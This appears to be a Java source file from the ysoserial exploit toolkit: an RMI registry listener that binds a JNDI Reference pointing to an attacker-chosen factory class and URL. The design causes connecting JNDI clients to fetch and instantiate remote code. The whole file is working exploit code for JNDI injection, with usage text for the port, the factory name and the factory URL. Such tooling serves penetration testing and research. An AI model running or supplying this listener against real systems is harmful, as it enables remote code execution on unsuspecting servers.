package ysoserial.exploit;


import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.io.IOException;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;


/**
 * Generic JRMP listener
 *
 * Opens up an JRMP listener that will deliver the specified payload to any
 * client connecting to it and making a call.
 *
 * @author mbechler
 *
 */
@SuppressWarnings ( {
    "restriction"
} )
public class RMIRefListener2 {

    private int port;
    private Object payloadObject;
    private String factoryName;
    private String factoryURL;


    public RMIRefListener2(int port, String factoryName, String factoryURL, Object payloadObject ) throws NumberFormatException, IOException {
        this.port = port;
        this.payloadObject = payloadObject;
        this.factoryName = factoryName;
        this.factoryURL = factoryURL;
    }

    public static final void main ( final String[] args ) throws Exception{

        if ( args.length < 3 ) {
            System.err.println(RMIRefListener2.class.getName() + " <port> <factory_name> <factory_url>");
            System.exit(-1);
            return;
        }

        Reference reference = new Reference(args[ 1 ],args[ 1 ],args[ 2 ]);
        final Object payloadObject = new ReferenceWrapper(reference);

        try {
            int port = Integer.parseInt(args[ 0 ]);
            System.err.println("* Opening JRMP listener on " + port);
            System.err.println("* URL: rmi://some-host:"+port+"/"+args[1]);
            RMIRefListener2 c = new RMIRefListener2(port, args[1], args[2], payloadObject);
            c.run();
        }
        catch ( Exception e ) {
            System.err.println("Listener error");
            e.printStackTrace(System.err);
        }
    }

    public void run() throws Exception {
        Registry registry = LocateRegistry.createRegistry(port);
        registry.bind(factoryName, (Remote) payloadObject);
    }
}
